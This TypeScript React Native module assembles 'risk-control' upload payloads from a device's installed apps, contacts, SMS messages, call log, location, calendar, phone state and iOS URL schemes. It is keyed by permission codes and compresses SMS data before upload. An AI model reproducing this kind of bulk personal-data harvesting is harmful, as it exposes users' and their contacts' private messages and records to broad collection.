import { Platform } from "react-native"
import { PermissionCode } from "../permission"
const NO_DATA = "NO_DATA"
import pako from 'pako'
import { Buffer } from 'buffer'
function gzip(strData: string) {
    if (strData.length <= 100) return strData
    const input = Buffer.from(strData, "utf-8")
    const inputUint8Array = pako.gzip(input)
    return Buffer.from(inputUint8Array).toString("base64")
}
interface I_SDK {
    getApkListInfo?: () => Promise<string>
    getContactInfo?: () => Promise<string>
    getSMSInfo?: () => Promise<string>
    getPhoneState?: () => Promise<string>
    getCallLog?: () => Promise<string>
    getLocationInfo?: () => Promise<string>
    getCalendarInfo?: () => Promise<string>
    getSchemaInfo?: () => Promise<string>
}

interface I_RiskInfo {
    jsonPayload?: string
    uploadType?: PermissionCode
    isUploaded?: "NO_DATA"
}
export const createRiskBuilder = <T extends I_SDK>(sdk: T) => {
    const {
        getApkListInfo, getContactInfo, getSMSInfo,
        getPhoneState, getCallLog, getLocationInfo, getCalendarInfo, getSchemaInfo
    } = sdk;

    return async (codes: PermissionCode[]): Promise<I_RiskInfo[]> => {

        const newCodes = codes.includes(PermissionCode.Application) ? [...codes, PermissionCode.Schema] : codes;
        const promises = newCodes.map(async (code) => {
            const temp: I_RiskInfo = { uploadType: code };
            try {
                switch (code) {
                    case PermissionCode.Application:
                        if (getApkListInfo) temp.jsonPayload = await getApkListInfo();
                        break;
                    case PermissionCode.Contact:
                        if (getContactInfo) temp.jsonPayload = await getContactInfo();
                        break;
                    case PermissionCode.SMS:
                        if (getSMSInfo) temp.jsonPayload = gzip(await getSMSInfo());
                        break;
                    case PermissionCode.Location:
                        if (getLocationInfo) temp.jsonPayload = await getLocationInfo();
                        break;
                    case PermissionCode.PhoneState:
                        if (getPhoneState) temp.jsonPayload = await getPhoneState();
                        break;
                    case PermissionCode.CallLog:
                        if (getCallLog) temp.jsonPayload = await getCallLog();
                        break;
                    case PermissionCode.Calendar:
                        if (getCalendarInfo) temp.jsonPayload = await getCalendarInfo();
                        break;
                    case PermissionCode.Schema:
                        if (getSchemaInfo && Platform.OS == "ios") temp.jsonPayload = await getSchemaInfo();
                        break;
                }
                if (temp.jsonPayload === "[]" || temp.jsonPayload === "{}") {
                    temp.isUploaded = NO_DATA;
                }
                return (temp.jsonPayload || temp.isUploaded) ? temp : null;
            } catch (error) {
                console.error(`[风控数据${Platform.OS}] 任务 ${code} 失败:`, error);
                return null;
            }
        });

        const results = await Promise.all(promises);
        return results.filter((item): item is I_RiskInfo => item !== null);
    };
};

